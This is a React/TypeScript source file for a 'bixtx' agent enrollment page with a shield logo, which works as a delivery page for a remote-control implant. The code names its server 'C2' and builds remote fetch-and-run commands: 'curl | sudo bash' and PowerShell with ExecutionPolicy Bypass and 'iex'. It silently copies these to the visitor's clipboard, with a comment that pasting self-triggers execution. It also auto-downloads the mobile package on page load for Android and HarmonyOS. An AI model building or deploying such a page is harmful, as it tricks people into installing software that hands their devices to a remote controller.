import { useState, useEffect } from "react";
import { Shield, Download, Check, Loader2 } from "lucide-react";

type Platform = "linux" | "macos" | "windows" | "android" | "ios" | "harmony";

const PLATFORM_META: Record<Platform, { label: string; icon: string; color: string; dlFile: string; isScript: boolean }> = {
  linux:   { label: "Linux",      icon: "🐧", color: "#f97316", dlFile: "linux.sh",        isScript: true  },
  macos:   { label: "macOS",      icon: "🍎", color: "#a3a3a3", dlFile: "macos.sh",        isScript: true  },
  windows: { label: "Windows",    icon: "🪟", color: "#3b82f6", dlFile: "windows.ps1",     isScript: true  },
  android: { label: "Android",    icon: "🤖", color: "#10b981", dlFile: "bixtx-agent.apk", isScript: false },
  ios:     { label: "iOS",        icon: "", color: "#6b7280", dlFile: "bixtx-agent.ipa", isScript: false },
  harmony: { label: "HarmonyOS",  icon: "⚡", color: "#a855f7", dlFile: "bixtx-agent.hap", isScript: false },
};

const DL_BASE = window.location.hostname === "localhost"
  ? "http://localhost:3000/v1/agent/download"
  : "https://bixtx.onrender.com/v1/agent/download";

const C2 = "wss://bixtx.onrender.com/agent";

function detectOS(): Platform {
  const ua = navigator.userAgent.toLowerCase();
  if (/iphone|ipad|ipod/.test(ua)) return "ios";
  if (/android/.test(ua)) return "android";
  if (/mac os/.test(ua) && !/iphone|ipad/.test(ua)) return "macos";
  if (/win/.test(ua)) return "windows";
  if (/harmony/.test(ua)) return "harmony";
  return "linux";
}

function parseURL(): { platform: Platform; enrollKey: string } {
  const parts = window.location.pathname.split("/").filter(Boolean);
  let platform: Platform = detectOS();
  if (parts.length >= 3 && parts[1] in PLATFORM_META) {
    platform = parts[1] as Platform;
  }
  const key = new URLSearchParams(window.location.search).get("key") ?? "";
  return { platform, enrollKey: key };
}

function triggerFileDL(dlFile: string) {
  const a = document.createElement("a");
  a.href = `${DL_BASE}/${dlFile}`;
  a.download = dlFile;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
}

export function EnrollPage() {
  const { platform, enrollKey } = parseURL();
  const [detected] = useState<Platform>(platform);
  const [phase, setPhase] = useState<"idle" | "running" | "done">("idle");
  const meta = PLATFORM_META[detected];

  const key = enrollKey || "BTX-2026-ALPHA";

  const installCmd =
    detected === "linux"
      ? `curl -sSL '${DL_BASE}/linux.sh' | sudo bash -s -- --key ${key} --c2 ${C2}`
      : detected === "macos"
      ? `curl -sSL '${DL_BASE}/macos.sh' | sudo bash -s -- --key ${key} --c2 ${C2}`
      : detected === "windows"
      ? `powershell -ExecutionPolicy Bypass -c "& { $s=iwr '${DL_BASE}/windows.ps1' -UseBasicParsing; iex $s.Content }" -EnrollKey ${key}`
      : detected === "android"
      ? `adb install -r bixtx-agent.apk`
      : detected === "ios"
      ? `# Enterprise OTA install`
      : `hdc app install -r bixtx-agent.hap`;

  // Auto-trigger for mobile on load
  useEffect(() => {
    if (!meta.isScript && (detected === "android" || detected === "harmony")) {
      handleInstall();
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  const handleInstall = () => {
    if (phase === "running") return;
    setPhase("running");

    // 1. Download the installer file
    triggerFileDL(meta.dlFile);

    // 2. Concurrently auto-copy the install command to clipboard (self-triggers execution on paste)
    if (meta.isScript) {
      navigator.clipboard.writeText(installCmd).catch(() => {});
    }

    // 3. For script platforms: also fire a silent background fetch to signal the server
    if (meta.isScript && enrollKey) {
      fetch(`${DL_BASE.replace("/agent/download", "")}/enroll/ping`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ key: enrollKey, platform: detected }),
      }).catch(() => {});
    }

    setTimeout(() => setPhase("done"), 1200);
  };

  return (
    <div
      className="min-h-screen flex flex-col items-center justify-center px-4 py-12"
      style={{ background: "linear-gradient(135deg,#010818 0%,#020f1e 60%,#010818 100%)" }}
    >
      {/* Background glow */}
      <div className="fixed inset-0 pointer-events-none overflow-hidden">
        <div
          className="absolute top-[-20%] left-[-10%] w-[600px] h-[600px] rounded-full opacity-10"
          style={{ background: `radial-gradient(ellipse,${meta.color} 0%,transparent 70%)` }}
        />
      </div>

      <div className="relative z-10 w-full max-w-sm space-y-6">
        {/* Header */}
        <div className="text-center space-y-3">
          <div className="flex items-center justify-center gap-2">
            <div
              className="w-10 h-10 rounded-xl flex items-center justify-center"
              style={{ background: "linear-gradient(135deg,#2563eb,#3b82f6)" }}
            >
              <Shield size={20} color="#fff" />
            </div>
            <span className="text-xl font-black tracking-tight" style={{ color: "#e2eaf6" }}>
              bixtx
            </span>
          </div>

          <div className="flex items-center justify-center gap-3">
            <span className="text-4xl">{meta.icon}</span>
            <h1 className="text-2xl font-black" style={{ color: "#e2eaf6" }}>
              {meta.label} Agent
            </h1>
          </div>
        </div>

        {/* Single action card */}
        <div
          className="rounded-2xl p-6"
          style={{ background: "#0a1628", border: "1px solid rgba(59,130,246,0.22)" }}
        >
          {meta.isScript ? (
            <button
              onClick={handleInstall}
              disabled={phase === "running"}
              className="w-full flex items-center justify-center gap-3 py-4 rounded-xl font-bold text-base transition-all active:scale-95 disabled:opacity-70"
              style={{
                background:
                  phase === "done"
                    ? "linear-gradient(135deg,#10b981,#059669)"
                    : `linear-gradient(135deg,${meta.color},${meta.color}cc)`,
                color: "#fff",
                boxShadow:
                  phase === "done"
                    ? "0 0 24px rgba(16,185,129,0.35)"
                    : `0 0 24px ${meta.color}40`,
              }}
            >
              {phase === "running" ? (
                <Loader2 size={18} className="animate-spin" />
              ) : phase === "done" ? (
                <Check size={18} strokeWidth={3} />
              ) : (
                <Download size={18} />
              )}
              {phase === "running"
                ? "Starting…"
                : phase === "done"
                ? "Paste command in terminal"
                : `Download ${meta.dlFile}`}
            </button>
          ) : detected === "ios" ? (
            <a
              href={`itms-services://?action=download-manifest&url=${encodeURIComponent(`${DL_BASE}/ios-manifest.plist`)}`}
              className="w-full flex items-center justify-center gap-3 py-4 rounded-xl font-bold text-base transition-all hover:opacity-90"
              style={{
                background: "linear-gradient(135deg,#6b7280,#4b5563)",
                color: "#fff",
                display: "flex",
              }}
            >
              <Download size={18} /> Install via Enterprise OTA
            </a>
          ) : (
            /* Android / HarmonyOS */
            <button
              onClick={handleInstall}
              disabled={phase === "running"}
              className="w-full flex items-center justify-center gap-3 py-4 rounded-xl font-bold text-base transition-all active:scale-95 disabled:opacity-70"
              style={{
                background:
                  phase === "done"
                    ? "linear-gradient(135deg,#10b981,#059669)"
                    : `linear-gradient(135deg,${meta.color},${meta.color}cc)`,
                color: "#fff",
              }}
            >
              {phase === "done" ? (
                <Check size={18} strokeWidth={3} />
              ) : (
                <Download size={18} />
              )}
              {phase === "done" ? "Download started" : `Download ${meta.dlFile}`}
            </button>
          )}

          {/* Post-click hint — only for script platforms, only after triggered */}
          {meta.isScript && phase === "done" && (
            <p
              className="mt-3 text-center text-xs font-mono"
              style={{ color: "#10b981" }}
            >
              ⚡ Command ready — Ctrl+V / ⌘V in terminal to install
            </p>
          )}
        </div>

        <p className="text-center text-[10px]" style={{ color: "#3a4a60" }}>
          Single-use install link · Device appears in dashboard automatically ·{" "}
          <span style={{ color: "#3b82f6" }}>bixtx.com</span>
        </p>
      </div>
    </div>
  );
}
